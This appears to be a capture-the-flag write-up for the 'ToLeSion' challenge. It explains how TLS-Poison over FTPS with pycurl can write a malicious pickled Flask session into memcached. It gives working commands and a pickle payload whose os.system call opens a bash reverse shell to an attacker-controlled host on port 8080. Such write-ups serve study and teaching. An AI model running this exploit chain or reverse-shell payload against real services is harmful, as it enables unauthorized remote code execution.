# ToLeSion

The key to solve this problem is TLS poison and pickle deserialization.

As you can see from the source code, flask uses memcached to store sessions. Interestingly, flask will use pickle to deserialize the memcached session when reading it. Therefore, we only need to write a malicious session to memcached and use the session to visit the website to trigger deserialization.

So how to write memcached?

Here are some hints:

* The capitalized words in "ToLeSion" are "TLS".
* Memcached - Classic TLS-Poison victim.
* Pycurl disables almost all protocols except FTPS.
* Set FTP_SKIP_PASV_IP to 0.
  
  > ftp-skip-pasv-ip sets curl not to use the ip and port provided by the server in passive mode. This setting is on by default after version 7.74.0, and setting it explicitly to 0 here is a very strong hint.

Obviously, we need to use ftps to implement TLS-Poison for the purpose of writing memcached.

Here is a recommendation for zeddy's blog, which is very comprehensive and detailed:

* https://blog.zeddyu.info/2021/04/20/TLS-Poison/
* https://blog.zeddyu.info/2021/05/19/tls-ctf/

Thanks to zeddy for writing such an excellent blog.

Simply put, when a client uses ftps://ip:port/ to access an ftps server, the ftps server specifies the ip and port for data transfer to the client in passive mode, and the client will reuse the information related to the first connection when connecting to that ip and port of the server, which leads to TLS-Poison (ssrf) here.

For the utilization of tls-poison, this github repository is recommended:

https://github.com/jmdx/TLS-Poison

We can use it to implement the TLS layer parsing. The following command will open the service listening on port 8000 and forward the application layer content after tls parsing to port 1234:

```shell
target/debug/custom-tls -p 8000 --verbose --certs /etc/letsencrypt/live/<your_domain>/fullchain.pem --key /etc/letsencrypt/live/<your_domain>/privkey.pem  forward 1234
```

Use redis to set up the payload:

```
set payload "\r\nset actfSession:whatever 0 0 <len>\n(S'/bin/bash -c \"/bin/bash -i >& /dev/tcp/<your_domain>/8080 0>&1\"'\nios\nsystem\n.\r\n"
```

Then open a ftp service on port 1234 and return the ip and port through passive mode, for this question, the ip is 127.0.0.1 and the port is 11200:

```
python3 FTPserverForTLSpoison.py 1234 127.0.0.1 11200
```

Control target machine access ftps://<your_ Domain>: 8000/, you can trigger the above TLS poison process to write a serialized string to memcached.

Finally, listen to port 8080 and use the session written above to access the website to trigger deserialization. Then you can gethell.